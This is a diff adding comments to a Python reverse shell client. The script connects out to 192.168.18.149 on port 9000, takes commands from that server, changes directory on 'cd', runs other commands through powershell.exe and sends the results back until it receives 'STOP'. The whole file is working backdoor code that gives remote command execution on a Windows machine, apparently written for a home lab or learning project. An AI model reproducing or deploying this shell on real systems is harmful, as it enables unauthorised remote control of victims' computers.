@@ -3,17 +3,21 @@ import os
 import subprocess
 identifier = "<END OF FILE>"
 arp_addresss = ("192.168.18.149",9000)
+# binding to serer ip
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(arp_addresss)
 while True:
     command = s.recv(1024)
     command = command.decode()
+    #for stopping command
     print(command)
     if command == "STOP":
         s.close()
         break
+    # for blank command
     elif command == "":
         continue
+    #for changing directory
     elif command.startswith("cd"):
         print("1")
         pathtomove = command.strip("cd ")
@@ -28,6 +32,8 @@ while True:
             print("not exist")
             message = "path doesnot exit"
 
+
+    #for running a command on pwershell
     else:
        raw_message =  subprocess.run(["powershell.exe",command],shell = True,capture_output=True)
        if raw_message.stderr == "".encode():
@@ -35,6 +41,6 @@ while True:
        else:
            message = "error"
 
-
+    #for encoding and sending messages
     message = message + identifier
     s.sendall(message.encode())
